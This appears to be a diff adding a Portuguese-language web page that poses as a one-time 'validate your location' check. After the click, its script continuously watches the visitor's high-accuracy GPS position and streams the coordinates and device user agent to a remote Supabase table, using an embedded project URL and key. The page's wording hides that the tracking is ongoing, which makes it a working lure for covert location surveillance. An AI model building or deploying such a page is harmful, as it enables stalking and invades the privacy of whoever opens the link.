@@ -1,0 +1,97 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rastreador Interno</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f4f7f6;
+        }
+
+        .btn-track {
+            background: #24b47e;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            transition: 0.3s;
+            cursor: pointer;
+            border: none;
+        }
+
+            .btn-track:hover {
+                background: #1c8c61;
+            }
+
+        #status {
+            margin-top: 20px;
+            color: #666;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Bem-vindo ao Sistema</h1>
+    <p>Clique no link abaixo para validar sua posição.</p>
+
+    <button id="track-btn" class="btn-track">Validar Localização</button>
+
+    <div id="status">Aguardando interação...</div>
+
+    <script>
+        // 1. Configuração do Supabase
+        const SUPABASE_URL = 'https://zqvfnykxwlcozvawqgrn.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxdmZueWt4d2xjb3p2YXdxZ3JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NDkzNDQsImV4cCI6MjA4NTMyNTM0NH0.CevpF9vP4748mb2vFNsOp5Kq6u7Nfp_100bJcW7ogUQ';
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        const btn = document.getElementById('track-btn');
+        const statusDiv = document.getElementById('status');
+
+        btn.addEventListener('click', () => {
+            if (!navigator.geolocation) {
+                statusDiv.innerText = "Erro: Geolocalização não suportada.";
+                return;
+            }
+
+            statusDiv.innerText = "Solicitando permissão e rastreando...";
+
+            // watchPosition mantém o envio enquanto o usuário se move
+            navigator.geolocation.watchPosition(async (posicao) => {
+                const { latitude, longitude, accuracy } = posicao.coords;
+
+                // 2. Envia os dados para a tabela 'rastreio'
+                const { error } = await supabase
+                    .from('rastreio')
+                    .insert([{
+                        latitude: latitude,
+                        longitude: longitude,
+                        precisao: accuracy,
+                        dispositivo: navigator.userAgent
+                    }]);
+
+                if (error) {
+                    console.error("Erro ao salvar:", error);
+                    statusDiv.innerText = "Erro ao sincronizar dados.";
+                } else {
+                    statusDiv.innerText = `Sincronizado! Precisão: ${accuracy.toFixed(1)}m`;
+                }
+
+            }, (erro) => {
+                statusDiv.innerText = "Erro: Usuário recusou ou GPS desligado.";
+                console.error(erro);
+            }, {
+                enableHighAccuracy: true, // Força o GPS do celular
+                maximumAge: 0,            // Não aceita dados antigos
+                timeout: 10000            // Tenta conectar por 10s
+            });
+        });
+    </script>
+</body>
+</html>
